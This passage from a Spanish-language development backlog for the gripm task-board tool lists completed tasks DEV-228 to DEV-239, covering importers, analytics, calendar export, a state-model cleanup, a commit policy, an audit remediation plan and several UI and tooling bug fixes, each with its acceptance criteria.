4. **Instrucciones de la extensión Webview:** Documentar la instalación y uso del panel lateral en VS Code y Cursor.
5. **Flujo de Worktrees concurrentes:** Añadir guía de comandos para aislamiento multi-sesión con Git Worktrees.

**Criterios de Aceptación:**
- [x] #1 README.md actualizado con las nuevas capacidades y el enlace al Sandbox de Vercel
- [x] #2 README.es.md actualizado en perfecta sincronia y simetria con README.md
- [x] #3 Documentacion de perfiles CLI, Gatekeeper MCP, extension Webview y Git Worktrees
- [x] #4 npm run backlog:check pasa con codigo 0

---

#### [DEV-228] Importador Universal de Backlogs Externos para Migración Local-First (Jira, Linear y CSV)
- **Prioridad**: `medium` | **Tipo**: `feature`

Extender el sistema de importación para admitir la ingesta de backlogs exportados desde Jira y Linear (archivos CSV y JSON), transformándolos en tareas locales de gripm:
1. **Adopción con cero fricción:** Eliminar la barrera de entrada para equipos existentes que ya tienen tareas en Jira o Linear, permitiendo importar proyectos enteros con un clic o comando sin tipear nada a mano.
2. **Soberanía y privacidad de datos:** El procesamiento de los archivos de exportación se ejecuta 100% en local (en el cliente web y/o CLI). Cero llamadas a APIs de terceros, cero tokens y cero filtración de roadmap a la nube.
3. **Mapeo canónico inteligente:** Normalizar estados, títulos, descripciones y prioridades de Jira/Linear al formato estándar de gripm (`backlog/tasks/*.md` o `.gripm/backlog.json`), extrayendo criterios de aceptación y etiquetas automáticamente.

**Criterios de Aceptación:**
- [x] #1 Soporte para parsear exports de Jira en formato JSON y CSV mapeando estados, prioridades y descripciones
- [x] #2 Soporte para parsear exports de Linear en formato CSV y JSON preservando titulos, notas y estimaciones
- [x] #3 ImportWizardModal permite soltar o seleccionar archivos de export con previsualizacion y conteo de tareas antes de confirmar
- [x] #4 Comando CLI gripm import --file <path> para importar directamente desde la terminal
- [x] #5 Cero dependencias de red o llamadas remotas; conversion puramente local
- [x] #6 npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-229] Módulo Visual de Métricas de Flujo y Salud de Entregas (Analytics Tab)
- **Prioridad**: `low` | **Tipo**: `feature`

Diseñar e implementar un módulo opcional de métricas de ingeniería (`metrics` / `analytics`) en la barra de navegación, integrable con el catálogo de add-ons (DEV-220):
1. **Métricas de flujo continuo (Lean):** Brindar visibilidad del ritmo y cadencia de entrega (throughput semanal de tareas cerradas, cycle time promedio) sin caer en estimaciones burocráticas de horas quemadas.
2. **Salud y completitud de Criterios de Aceptación:** Panel visual con gráficos locales que muestra el ratio de criterios de aceptación verificados (`- [x]`) versus pendientes por release o sprint.
3. **Desacoplado y configurable:** Módulo opcional gobernable vía `enabledTabs.metrics` en `.gripm/config.json`. Quien prefiera la experiencia minimalista puede mantenerlo desactivado.
4. **Cálculo reactivo local-first:** Las métricas se calculan en tiempo real leyendo los propios archivos del proyecto en memoria, sin telemetría externa ni servicios analíticos de terceros.

**Criterios de Aceptación:**
- [x] #1 Pestaña opcional de métricas en la barra de navegación gobernable vía enabledTabs.metrics en .gripm/config.json
- [x] #2 Gráficos de throughput y distribución por tipo y estado usando visualización ligera nativa en SVG/Tailwind sin dependencias externas pesadas
- [x] #3 Panel de salud de criterios de aceptación que resume avance de verificación por release y sprint
- [x] #4 Computo reactivo en memoria sin consultas a red ni telemetria externa
- [x] #5 Textos completamente localizados en espanol e ingles en src/utils/i18n.ts
- [x] #6 npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-230] Exportación Liviana de Eventos de Calendario sin Dependencias Cloud (Web Intent e iCal)
- **Prioridad**: `low` | **Tipo**: `improvement`

Permitir a los usuarios vincular tareas o hitos de entrega con sus calendarios personales de manera inmediata y sin comprometer la privacidad:
1. **Web Intent directo de Google Calendar:** Acción contextual en `ItemModal` ("Agendar en Calendario") que construye y abre una URL de intención web directa (`calendar.google.com/calendar/render?action=TEMPLATE...`) con el título `[ID] Título`, enlace local y notas de la tarea precargadas.
2. **Descarga de archivo estándar iCalendar (.ics):** Generación instantánea en el navegador de un archivo `.ics` para usuarios de Apple Calendar, Outlook o clientes locales de calendario.
3. **Cero dependencias cloud:** No requiere OAuth, permisos corporativos de Google Workspace, almacenamiento de tokens ni sincronizadores en segundo plano. Privacidad absoluta y cero mantenimiento de servidores.

**Criterios de Aceptación:**
- [x] #1 Accion contextual en ItemModal para agendar sesion o evento a partir de los datos de la tarea
- [x] #2 Generacion de enlace Web Intent para Google Calendar con titulo y notas de la tarea precargados sin requerir OAuth
- [x] #3 Opcion de descarga de archivo .ics universal compatible con clientes de calendario de escritorio
- [x] #4 Cero almacenamiento o transmision de credenciales y cero dependencias de APIs cloud
- [x] #5 Textos localizados en espanol e ingles en src/utils/i18n.ts
- [x] #6 npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-231] Unificación del modelo de estados y taxonomía del Delivery Flow (draft a done)
- **Prioridad**: `high` | **Tipo**: `feature`

Reconciliar y armonizar el modelo de estados del proyecto y el playbook (`STATE_MACHINE.md`, `AGENTS.md`, `TEAM_PLAYBOOK.md` y `gripm` core), erradicando ambigüedades y errores no forzados en los extremos del flujo:
1. **Entrada al flujo (Backlog no es estado, las tareas nacen en draft):** Establecer formalmente que el "Backlog" es el contenedor / dimensión de planificación (el inventario de trabajo no iniciado), NO un valor de estado. Los ítems del Backlog nacen de forma legítima con el estado `draft` (o `ideas` para descubrimiento). Erradicar la noción confusa de "ítems sin estado".
2. **Salida del desarrollo (ready es la meta de dev, done es exclusivo del release):** Clarificar que `ready` es la entrega formal de desarrollo (código implementado, probado y certificado). Marcar `done` antes del deploy/release es una mentira de estado que rompe el Release Assembler de Gripm. El paso a `done` lo realiza el empaquetado de release.
3. **Flujo de vida completo y unificado:**
   - **Discovery / Pool:** `ideas`
   - **Backlog (definida / en especificación):** `draft`
   - **Flujo activo de desarrollo:** `doing` ➔ `review` ➔ `ready` (línea final del dev/agente)
   - **Producción / Despliegue:** `done` (asignado al sellar/desplegar el release)
   - **Salidas fuera de flujo:** `dismissed`, `cancelled`
4. **Sincronización documental bidireccional:** Actualizar `STATE_MACHINE.md` en gripm-playbook y las referencias en `AGENTS.md` de ambos repositorios para que reflejen esta taxonomía clara, unívoca y sin fricciones.

**Criterios de Aceptación:**
- [x] #1 STATE_MACHINE.md en gripm-playbook reconoce explicitamente a draft como el estado formal del backlog e ideas como discovery
- [x] #2 Se erradica la regla ambigua de "items sin estado" preservando status: draft como valor canonico al crear tareas
- [x] #3 Documentacion explicita que fija a ready como la meta terminal del desarrollador/agente y a done como evento de release/deploy
- [x] #4 AGENTS.md en gripm y gripm-playbook reflejan con precision el flujo completo sin ambiguedades
- [x] #5 Coherencia 100% entre src/types.ts, src/utils/statusMeta.ts, ReleaseAssembler y las reglas de gobernanza
- [x] #6 npm run backlog:check y npm test pasan con codigo 0

---

#### [DEV-232] Política pragmática de commits y gobernanza de Git respaldada por hooks pre-commit
- **Prioridad**: `high` | **Tipo**: `feature`

Evolucionar la gobernanza de Git en el Playbook y en Gripm hacia un modelo pragmático, libre de burocracia innecesaria y respaldado por la garantía mecánica de los hooks pre-commit:
1. **El hook pre-commit como guardián de calidad:** Reconocer que la integridad del repositorio está asegurada por el hook `verify-backlog-sync.js` y la Pirámide de Verificación (tipos, tests, sincronización). Ningún commit roto puede ingresar al historial.
2. **Cadencia limpia de commits (1 tarea = 1 commit consolidado):** Evitar la proliferación de micro-commits desordenados durante la fase exploratoria. La norma canónica es un commit atómico y limpio por tarea completada y certificada, incluyendo el archivo `.md` de la tarea y el código asociado.
3. **Erradicación de bloqueos burocráticos:** Descartar contraseñas, tokens o mecanismos que entorpezcan el flujo de trabajo tanto del desarrollador humano como del agente.
4. **Claridad en la soberanía de commits:** Definir pautas claras en `AGENTS.md` y `git-workflow.md` sobre cuándo el agente debe preparar el commit o solicitar confirmación según el modo operativo (autónomo vs asistido), manteniendo siempre mensajes convencionales estandarizados (`feat(DEV-XXX): ...`, `fix(DEV-XXX): ...`).

**Criterios de Aceptación:**
- [x] #1 Actualizacion de la politica de commits en AGENTS.md y git-workflow.md enfatizando la cadencia de 1 commit consolidado por tarea
- [x] #2 Reafirmacion de los hooks pre-commit como unica salvaguarda mecanica indispensable sin burocracia adicional
- [x] #3 Formato canonico de mensaje de commit estandarizado vinculado de forma univoca al ID de la tarea DEV-XXX
- [x] #4 Guia clara para agentes sobre cuando preparar cambios y como interactuar con el arbol de trabajo
- [x] #5 npm run backlog:check y npm test pasan con codigo 0

---

#### [DEV-233] Auditoria integral 2026-10-10 y plan de remediacion por fases
- **Prioridad**: `high` | **Tipo**: `initiative`

Auditoria exhaustiva de `@gripm/board@1.1.0` (`f9dadc3`) sobre cuatro ejes: codigo de
`src/`, capa de tooling en `scripts/`, capa de reglas y documentacion, y artefactos de
proceso (backlog, releases, sprints, retrospectivas). Ademas: historia completa de git y
reconstruccion de la cadena de incidentes de CI.

**El informe completo vive fuera del backlog, en `docs/archive/auditoria-2026-10-10.md`.**
Esta tarea solo lo referencia y le da seguimiento. El texto no se duplica aqui a
proposito: el informe tiene ~1.100 lineas y 90 hallazgos con ID estable, y copiarlo al
backlog lo convertiria en otro documento que nadie puede mantener sincronizado.

### Como se referencian los hallazgos

El informe asigna un ID estable a cada hallazgo, con prefijo por dominio:

| Prefijo | Significado | Hallazgos |
|---|---|---|
| `SEC-xx` | Seguridad | 10 |
| `BUG-xx` | Defecto funcional | 19 |
| `GATE-xx` | El gate de calidad no cumple su contrato | 17 |
| `TOOL-xx` | Defecto de tooling / scripts | 12 |
| `PROC-xx` | Proceso, datos o trazabilidad | 16 |
| `DOC-xx` | Documentacion y reglas | 20 |
| `ARCH-xx` | Deuda tecnica estructural | 9 |
| `OK-xx` | Acierto a preservar, normativo | 17 |

**Total: 103 hallazgos verificados + 17 aciertos documentados como normativa.**

Conteo obtenido del documento, no estimado: cada ID con definicion aparece como seccion
`### XXX-nn` (83 de 104) o como fila de tabla en §8.5 y §10 (los `DOC-xx` y `OK-xx`).
El ID `PROC-17` aparece unicamente dentro de la fe de erratas de §0.4,
como referencia al numbering anterior.

Los IDs sobreviven al documento: permiten que tareas hijas, commits y revisiones se
refieran a algo concreto. `SEC-01`, `BUG-01` y `GATE-03` significan lo mismo dentro de seis
meses.

### El hallazgo que resume todos los demas

**El gate de calidad estuvo verde todo el tiempo porque midio presencia de codigo, no
comportamiento.**

`npm test` corre 16 pasos en 31.8 s y pasa. Mientras tanto, cinco modales lanzan
`Rendered more hooks than during the previous render` y matan la aplicacion al abrirse.
`scripts/verify-focus-trap.js` tiene el chequeo de orden de hooks correcto y lo aplico
**unicamente al unico archivo que ya complyia**.

### La razon de esta tarea

La auditoria anterior (`docs/informe-auditoria.md`, cerrada en DEV-181) ejecuto sus
recomendaciones pero no dejo nada verificable: no habia forma de saber meses despues si un
hallazgo seguía abierto. Esta tarea existe para no repetir eso. Cada fase de la seccion 11
del informe tiene una columna "Verificacion de cierre" con un comando ejecutable.

### Regla de cierre heredada del informe

> Un hallazgo pasa a cerrado cuando su comando de verificacion deja de detectar el
> problema **y** un comando de regresion lo impediria volver a aparecer.
>
> Tildar un AC sin esa asercion es exactamente el fallo que esta auditoria documenta.

**Criterios de Aceptación:**
- [x] #1 El informe `docs/archive/auditoria-2026-10-10.md` esta commiteado y cada hallazgo tiene ID estable, referencia `archivo:linea` o comando de reproduccion
- [x] #2 Las 5 fases de la seccion 11 del informe tienen cada una su criterio de verificacion de cierre escrito como comando ejecutable, no como descripcion
- [x] #3 Los 17 hallazgos `OK-xx` estan marcados como normativa: ningun refactor posterior puede eliminarlos sin una tarea que lo justifique
- [x] #4 La seccion 11.3 (lo que queda deliberadamente sin resolver: PROC-01, TOOL-08, SEC-06, PROC-10/12/13/14/15) tiene una decision del PO registrada, no un silencio
- [x] #5 Cada fase que se abra genera tareas hijas con `dependencies: [DEV-233]` y un ID propio, para que el cierre sea rastreable por tarea y no por opinion
- [x] #6 Ningun hallazgo se marca cerrado sin que su comando de verificacion deje de detectar el problema Y exista un comando de regresion que lo impida reaparecer
- [x] #7 El informe anterior `docs/informe-auditoria.md` queda referenciado desde DEV-181 con la nota de que fue cerrado sin verificacion, como antecedente del porque de esta tarea
- [x] #8 Fase 0 (DEV-234) completada y certificada: Primitivo Modal accesible y Estabilidad Funcional P0 (BUG-01, BUG-03, ARCH-06)
- [x] #9 Fase 1 (DEV-235) completada y certificada: Integridad del Quality Gate y Verificacion Multiplataforma (GATE-01 a GATE-17)
- [x] #10 Fase 2 (DEV-242, DEV-244, DEV-246) completada y certificada: Remediacion Integral de Seguridad (SEC-01 a SEC-10)
- [x] #11 Fase 3: Proceso y documentacion (DOC-01 a DOC-22, saneamiento tooling y falsos positivos §8.5, purga DEV-238)
- [x] #12 Fase 4: Deuda estructural desacoplada formalmente a DEV-165 (modularizacion de vite.config.ts ARCH-01) y backlog

---

#### [DEV-234] Fase 0: Primitivo Modal accesible y Estabilidad Funcional P0
- **Prioridad**: `high` | **Tipo**: `bug`

Implementación de la Fase 0 del plan de remediación de la auditoría integral (DEV-233):
Resolución de defectos funcionales P0, crashes en tiempo de ejecución al abrir modales y consolidación del componente primitivo accesible `<Modal>`.

### Problemas abordados

1. **BUG-01 / ARCH-06:** En cinco modales (`ProjectModal`, `ImportWizardModal`, `SprintModal`, `FolderPickerModal`, `CompleteSprintModal`), `useFocusTrap` se invocaba después de `if (!isOpen) return null`. Al cambiar `isOpen` a `true`, React lanzaba *"Rendered more hooks than during the previous render"* crasheando la app. Además, el andamiaje de diálogo estaba duplicado a mano en 8 archivos sin un primitivo común y 10 de 13 overlays carecían de portal sobre `document.body` (BUG-16).
2. **BUG-03:** En `ConfirmModal.tsx`, un listener global de `window` a la tecla `Enter` ejecutaba el borrado incluso cuando el foco del usuario estaba posicionado sobre el botón "Cancelar". Además, `onConfirm()` carecía de `catch`, ocultando excepciones y cerrando el modal erróneamente en caso de fallo.
3. **BUG-15 / BUG-18 / BUG-19:** Notificaciones `Toast.tsx` invisibles para lectores de pantalla (sin `role="status"` ni `aria-live`), botones de solo icono sin `aria-label` descriptivo, y elementos `<label>` sin vinculación `htmlFor`/`id`.
4. **BUG-17:** Elementos fijos móviles (barra inferior, header, toasts) sin soporte de `env(safe-area-inset-*)`, provocando solapamiento en dispositivos con home bar o notch.
5. **GATE-09:** `scripts/verify-focus-trap.js` solo validaba el orden de hooks en `ItemModal`, dejando ciegos a los demás diálogos.

**Criterios de Aceptación:**
- [x] #1 Extraer primitivo `Modal.tsx` con soporte de portal en `document.body`, `role="dialog"`, `aria-modal="true"`, trampa de foco y backdrop click (ARCH-06, BUG-16)
- [x] #2 Corregir el orden de hooks en los modales (`ProjectModal`, `PlanGuardModal`, `ImportWizardModal`, `SprintModal`, `FolderPickerModal`, `CompleteSprintModal`), invocando `useFocusTrap` antes de cualquier early return condicional (BUG-01)
- [x] #3 Blindar `ConfirmModal.tsx` removiendo listener global de Enter ciego al foco y manejando rechazos de `onConfirm` con `try/catch` sin cerrar el modal en error (BUG-03)
- [x] #4 Incorporar accesibilidad en `Toast.tsx` (`role="status"`, `aria-live="polite"`, `aria-label` en botón de descarte) y nombres accesibles en botones icon-only (BUG-15, BUG-18)
- [x] #5 Asociar etiquetas `<label htmlFor>` con `<input id>` en `PlanGuardModal`, `ItemModal` y selectores (BUG-19)
- [x] #6 Aplicar variables de `env(safe-area)` en navegación inferior móvil, encabezado superior y toasts (`grep -c 'env(safe-area' src/` >= 3) (BUG-17)
- [x] #7 Actualizar `scripts/verify-focus-trap.js` para certificar mecánicamente que `hookIndex < closedGuardIndex` en todos los 8 diálogos de la aplicación (GATE-09)
- [x] #8 Pirámide de verificación pasa en verde: `npx tsc --noEmit`, `npm test`, `npm run backlog:check`, `npm run audit:ux`, `npm run build` y `npm run publish:check`

---

#### [DEV-235] Fase 1: Integridad del Quality Gate y Verificación Multiplataforma
- **Prioridad**: `high` | **Tipo**: `chore`

Implementación de la Fase 1 del plan de remediación de la auditoría técnica integral (DEV-233):
Restaurar la integridad, reproducibilidad y carácter multiplataforma del Quality Gate en CI y local.

### Problemas abordados

1. **GATE-03 / GATE-04:** En Windows, las observaciones del baseline de UX fallaban la coincidencia debido al uso de backslashes (`\`) en `path.relative()`, provocando que el verificador omitiera silenciosamente las aserciones de delta con un aviso. Se incorpora `toPosixPath()` en `audit-ux-code.cjs` y se remueve el bypass en `verify-audit-ux-baseline.js`.
2. **GATE-05:** Erradicación de tres bloques `catch {}` mudos en `verify-backlog-sync.js` (reglas de documentación, integridad de `releases.json` e integridad de `sprints.json`), asegurando que cualquier fallo o corrupción de datos reporte error y bloquee el commit.
3. **GATE-06 / GATE-17:** En `mcp-server.ts`, registro explícito de fallos en mutaciones en lote (`bulk_update`) en lugar de responder falsos `ok: true`, y unificación del estado objetivo de completitud a `status: ready` canónico en lugar de `Done` en mayúscula.
4. **GATE-10:** Inclusión del flag `--ignore-scripts` al invocar `npm pack` en `verify-publish-surface.js`, impidiendo la mutación de `core.hooksPath` en `.git/config` durante la auditoría de empaquetado.
5. **GATE-11:** Envolvimiento de creación de fixtures temporales en bloques `try / finally` y suscripción a eventos de salida del proceso (`process.on('exit')`, `SIGINT`) en `verify-mcp-binary.js` y `verify-resilience-and-cli.js`.
6. **GATE-14 / GATE-15:** Validación estricta y numérica de argumentos `--timeout` y variable `GRIPM_WATCHDOG_MS` para impedir ejecuciones instantáneas con `NaN` o `0ms`, y soporte de control de corte con `--bail` / `--no-bail`.
7. **GATE-01 / GATE-16:** Integración de `verify-changes.js --all` en CI (`.github/workflows/ci.yml`) y extensión del presupuesto de tiempo de ejecución de jobs de 25m a 35m.

**Criterios de Aceptación:**
- [x] #1 Normalizar rutas con `toPosixPath` en `audit-ux-code.cjs` y remover el bypass de Windows en `verify-audit-ux-baseline.js` (GATE-03, GATE-04)
- [x] #2 Reemplazar catches silenciosos por logging y conteo de errores en `verify-backlog-sync.js` (GATE-05)
- [x] #3 Manejar fallos de escritura en `bulk_update` y unificar transición automática a `status: ready` en `mcp-server.ts` (GATE-06, GATE-17)
- [x] #4 Preservar el contrato de solo lectura en `verify-publish-surface.js` pasando `--ignore-scripts` a `npm pack` (GATE-10)
- [x] #5 Garantizar limpieza de archivos de prueba temporales (`DEV-998`, `DEV-999`) con `try/finally` y hooks de proceso (GATE-11)
- [x] #6 Validar argumentos `--timeout` numéricos y fallback seguro de `GRIPM_WATCHDOG_MS` (GATE-14, GATE-15)
- [x] #7 Integrar `verify-changes.js --all` y ampliar timeout a 35m en `.github/workflows/ci.yml` (GATE-01, GATE-16)
- [x] #8 Pirámide de verificación en verde: `npx tsc --noEmit`, `npm test`, `npm run backlog:check`, `npm run audit:ux`, `npm run build` y `npm run publish:check`

---

#### [DEV-236] Selector de Proyectos Queda por Detrás de la Barra de Filtros por Conflicto de Stacking Context
- **Prioridad**: `high` | **Tipo**: `bug`

Al abrir el selector desplegable de proyectos en el encabezado (`Header.tsx`), la parte superior del menú quedaba visualmente oculta **por detrás de la barra de búsqueda y filtros** (`FilterBar.tsx`), mostrando únicamente la sección inferior sobre las columnas de Kanban.

### Causa Raíz

Conflicto de niveles de apilamiento (*stacking context tie*):
- Tanto `<header>` (`Header.tsx:122`) como el contenedor de `<FilterBar>` (`FilterBar.tsx:162`) declaraban la misma clase de z-index: `z-30`.
- Ambos elementos establecen contextos de apilamiento posicionados (`sticky` y `relative`).
- En el árbol DOM (`App.tsx`), `FilterBar` se renderiza inmediatamente después de `Header`.
- Según la especificación CSS 2.1 (Apéndice E), cuando dos contextos de apilamiento hermanos tienen el mismo valor de `z-index`, el orden en el documento determina la prioridad de pintado. `FilterBar` se pintaba encima de `Header` y de todos sus descendientes (incluyendo el menú desplegable del selector con `z-50`).

### Solución

Ajustar la jerarquía canónica de z-index del sistema:
- `FilterBar.tsx`: Reducir de `z-30` a `z-10`. De este modo, `FilterBar` conserva prioridad sobre el contenido del tablero (tarjetas y columnas en `z-auto`), pero queda estrictamente por debajo de `Header` (`z-30`).
- El menú del selector de proyectos (`z-50` dentro de `Header`) se proyecta limpiamente por encima de la barra de filtros.
- Al hacer scroll, `FilterBar` se desliza correctamente por debajo del encabezado adhesivo (`Header`).
- Incorporar prueba anti-regresión en `scripts/test-ui-logic.js` para certificar la jerarquía `headerZ > filterBarZ`.

**Criterios de Aceptación:**
- [x] #1 FilterBar define z-index inferior al de Header (z-10 vs z-30) para evitar colisión de contextos de apilamiento
- [x] #2 El menú desplegable del selector de proyectos se renderiza completamente por encima de FilterBar sin oclusión visual
- [x] #3 FilterBar y su popover de filtros avanzados mantienen prioridad sobre las columnas y tarjetas del tablero
- [x] #4 Prueba estática anti-regresión en test-ui-logic.js que valida invariante headerZ > filterBarZ
- [x] #5 Pirámide de verificación en verde (tsc --noEmit, npm test, backlog:sync, backlog:check)

---

#### [DEV-237] Resolución integral de Restaurar Proyecto Demo (Error 415 por Content-Type y activación multi-proyecto)
- **Prioridad**: `high` | **Tipo**: `bug`

Al invocar la acción "Restaurar Proyecto Demo" desde el selector de proyectos, se manifestaban dos fallas consecutivas:
1. **Error HTTP 415 (Unsupported Media Type):** Al enviar la petición `POST /api/projects/restore-demo`, el middleware de seguridad CSRF de `vite.config.ts` rechazaba la solicitud por no incluir `Content-Type: application/json`.
2. **Invisibilidad y falta de activación del Demo:** Tras resolver el 415, el servidor respondía OK y mostraba el toast de éxito, pero la pantalla no mostraba ningún cambio ni proyecto demo. Esto ocurría por dos factores combinados:
   - En `vite.config.ts`, `isSingleMode` forzaba `true` de manera incondicional ante la ausencia de `process.env.GRIPM_MODE='multi'` (ignorando `config.mode: "multi"` de `.gripm/config.json` y la existencia de múltiples proyectos en el registro). Como resultado, `GET /api/data` filtraba y descartaba todos los proyectos del registro excepto el proyecto activo inicial (`gripm`), impidiendo que el cliente recibiera el proyecto demo y sus ítems.
   - En `src/App.tsx`, `handleRestoreDemo` no conmutaba `selectedProjectId` a `'demo'`, dejando la interfaz anclada en el proyecto anterior.

### Solución

1. **Headers de mutación en `src/api.ts`:** Se agregaron `headers: { 'Content-Type': 'application/json' }` y `body: JSON.stringify({})` en `restoreDemoProject()`, `convertProjectToMd()` y `convertProjectToJson()`.
2. **Detección consistente de `isSingleMode` en `vite.config.ts`:**
   - Respeta `config.mode` (`"multi"` / `"single"`) definido en `.gripm/config.json`.
   - Si no hay modo forzado por entorno ni configuración, deriva `isSingleMode` dinámicamente según `registry.projects.length <= 1`, permitiendo que coexistan múltiples proyectos sin forzar monoproyecto artificial.
3. **Activación de proyecto demo:**
   - En `vite.config.ts`, `POST /api/projects/restore-demo` establece `registry.activeProjectId = 'demo'`.
   - En `src/App.tsx`, `handleRestoreDemo` ejecuta `setSelectedProjectId('demo')`, sincroniza con `STORAGE_KEYS.ACTIVE_PROJECT_ID` y llama a `setActiveProjectApi('demo')`.
4. **Pruebas anti-regresión:** En `scripts/test-api-security.js`, se valida estáticamente que todas las peticiones `POST`/`PUT` de `src/api.ts` contengan `Content-Type: application/json`.

**Criterios de Aceptación:**
- [x] #1 restoreDemoProject, convertProjectToMd y convertProjectToJson envían Content-Type application/json
- [x] #2 /api/projects/restore-demo responde 200 OK y registra demo como activeProjectId sin error 415
- [x] #3 vite.config.ts respeta config.mode y registry.projects.length en isSingleMode sin ocultar proyectos registrados
- [x] #4 handleRestoreDemo en App.tsx conmuta selectedProjectId a demo y renderiza inmediatamente el tablero demo
- [x] #5 Prueba estática en test-api-security.js valida que todo fetch POST/PUT en src/api.ts incluye Content-Type application/json
- [x] #6 Pirámide de verificación en verde (tsc --noEmit, npm test, backlog:sync, backlog:check)

---

#### [DEV-238] Erradicación total de referencias legacy DevBoard (devboard, dev-board, .devboard, DEVBOARD_*) en código activo
- **Prioridad**: `high` | **Tipo**: `chore`

Invariante canónico del proyecto: **"Cualquier referencia en código activo a `dev-board`, `devboard`, `.devboard` o `DEVBOARD_*` es un defecto si no es `gripm`"**.

Tras la consolidación como paquete autónomo `@gripm/board`, no existe justificación para sostener capas de compatibilidad con versiones pre-1.0. Esta tarea define la purga atómica e integral de todas las variantes del nombre histórico en el código fuente.

### Inventario de las 5 Capas de Purga

1. **Variables de entorno de proceso:**
   - Erradicar todos los operadores fallback `|| process.env.DEVBOARD_*` en `vite.config.ts`, `bin/gripm.js`, `scripts/registryConfig.js` y `scripts/updateChecker.js`.
   - Variables a purgar: `DEVBOARD_MODE`, `DEVBOARD_HOST`, `DEVBOARD_PORT`, `DEVBOARD_OPEN`, `DEVBOARD_ALLOWED_PATHS`, `DEVBOARD_ALLOWED_HOSTS`, `DEVBOARD_HOME`, `DEVBOARD_REGISTRY_PATH`, `DEVBOARD_TARGET_REPO`, `DEVBOARD_NO_UPDATE_CHECK`.
   - Único contrato válido: `GRIPM_*`.

2. **Directorios y rutas en disco:**
   - Purgar búsquedas de carpetas `.devboard/` y archivos `.devboard/config.json` o `.devboard/backlog.json` en `vite.config.ts` y scripts.
   - Purgar referencias a `data/dev-board.json` y `data/projects-registry.json` (incluyendo `.gitignore` y scripts de empaquetado).
   - Único contrato válido: `.gripm/`.

3. **Claves de almacenamiento en navegador (`src/utils/storage.ts`):**
   - Retirar los 9 arrays de claves alias legacy (`devboard-theme`, `devboard_active_tab`, `devboard_active_project_id`, `devboard_kanban_sprint`, etc.).
   - Único contrato válido: `gripm_*` / `gripm-*`.

4. **Nombres internos, plugins y contratos de TypeScript:**
   - En `vite.config.ts`: renombrar `devBoardApi()` a `gripmApi()`, `DevBoardPlugin` a `GripmPlugin`, y el nombre del plugin `'vite-plugin-dev-board-api'` a `'vite-plugin-gripm-api'`.
   - En `src/types.ts`: eliminar alias de tipo `export type DevBoardConfig = GripmConfig`.
   - En `src/api.ts`: renombrar propiedad `hasDevBoard` a `hasGripm`.
   - En `scripts/registryConfig.js`: renombrar `getDevBoardHomeDir()` a `getGripmHomeDir()`.

5. **Logs de consola y textos de usuario:**
   - Reemplazar prefijos de log `[DevBoard API]`, `[DevBoard Watcher]`, `[DevBoard FS]`, `[DevBoard Backlog.md]` por `[gripm ...]`.
   - Corregir descripción del proyecto demo en `vite.config.ts` ("Proyecto de demostración de gripm").

6. **Actualización de suites de test:**
   - Actualizar `scripts/test-api-security.js`, `scripts/verify-integration.js`, `scripts/verify-optimistic-locking.js`, `scripts/verify-sse.js` y `scripts/verify-legacy-import.js` para buscar e interactuar exclusivamente con `'vite-plugin-gripm-api'` y variables `GRIPM_*`.

**Criterios de Aceptación:**
- [x] #1 Cero ocurrencias de variables process.env.DEVBOARD_* en código fuente activo
- [x] #2 Cero referencias a carpetas .devboard/ o archivos dev-board.json en el runtime y scripts
- [x] #3 src/utils/storage.ts purgado de arrays de claves de retrocompatibilidad devboard_*
- [x] #4 vite.config.ts y types.ts renombran plugins y contratos internos a gripmApi / vite-plugin-gripm-api
- [x] #5 Logs de consola y descripciones en runtime estandarizados 100% en gripm
- [x] #6 Suites de prueba actualizadas al nuevo estándar sin romper ningún paso de la suite
- [x] #7 Pirámide de verificación en verde (tsc --noEmit, npm test con 16 pasos, backlog:sync, backlog:check)

---

#### [DEV-239] Unificación de switches on/off en Settings y erradicación de checkboxes nativos simples
- **Prioridad**: `high` | **Tipo**: `feature`

Al evolucionar la configuración de **Modules & Add-ons** (DEV-220) hacia switches interactivos on/off, se produjo una inconsistencia de UX en el resto de los paneles de configuración de `SettingsView.tsx`. Los controles booleanos en **Workflows & Views**, **Tablero Kanban** y **Apariencia** permanecieron implementados con `<input type="checkbox">` nativos del navegador, creando una experiencia fragmentada, poco ergonómica y visualmente heterogénea.

### Objetivos y Solución

1. **Componente Reutilizable y Accesible `SettingsSwitch`:**
   - Crear un componente `SettingsSwitch` en `src/components/SettingsView.tsx` estilizado con el design system canónico de Gripm.
   - Pista con esquinas redondeadas (`w-11 h-6`), botón deslizante con sombra sutil (`h-5 w-5 shadow-xs`) y transición suave (`transition-all duration-200`).
   - Micro-interacción táctil (`active:scale-95`).
   - Accesibilidad con foco visible de alto contraste (`peer-focus-visible:ring-2 peer-focus-visible:ring-indigo-500 peer-focus-visible:ring-offset-2`) y soporte `aria-label`.
   - Contenedor `span` para evitar anidamiento prohibido de `<label>` en tarjetas que ya son clickeables.

2. **Reemplazo Integral en Todas las Pestañas Afectadas:**
   - **Workflows & Views (`views`):** Reemplazar los 3 checkboxes nativos de pestañas visibles (`enabledTabs.kanban`, `enabledTabs.sprint`, `enabledTabs.release`).
   - **Tablero Kanban (`kanban`):** Reemplazar los 2 checkboxes nativos de configuración (`showIdeasByDefault`, `showDoneHistoryByDefault`).
   - **Apariencia (`visual`):** Reemplazar los 2 checkboxes nativos de preferencias (`autoSave`, `rankingEnabled`).
   - **Modules & Add-ons (`modules`):** Unificar los 3 switches existentes (`sprint`, `release`, `modeState === 'multi'`) usando también `SettingsSwitch` para eliminar código duplicado.

3. **Pruebas y Verificación:**
   - Validar estáticamente y unitariamente en tests que no queden checkboxes nativos simples en `SettingsView.tsx`.
   - Validar la accesibilidad y ergonomía con `npm run audit:ux` y la suite de pruebas completa `npm test`.

**Criterios de Aceptación:**
- [x] #1 Crear componente SettingsSwitch reutilizable, accesible (teclado + aria-label) y consistente en SettingsView.tsx
- [x] #2 Reemplazar checkboxes simples en Workflows & Views (kanban, sprint, release) por SettingsSwitch
- [x] #3 Reemplazar checkboxes simples en Tablero Kanban (showIdeasByDefault, showDoneHistoryByDefault) por SettingsSwitch
- [x] #4 Reemplazar checkboxes simples en Apariencia (autoSave, rankingEnabled) por SettingsSwitch
- [x] #5 Unificar los switches de Modules & Add-ons bajo el componente SettingsSwitch sin duplicación de markup
- [x] #6 Zero errores de tipos (npx tsc --noEmit) y cero checkboxes nativos residuales en SettingsView.tsx
- [x] #7 Suite de pruebas completa (npm test) y auditoría UX (npm run audit:ux) en verde sin regresiones

---

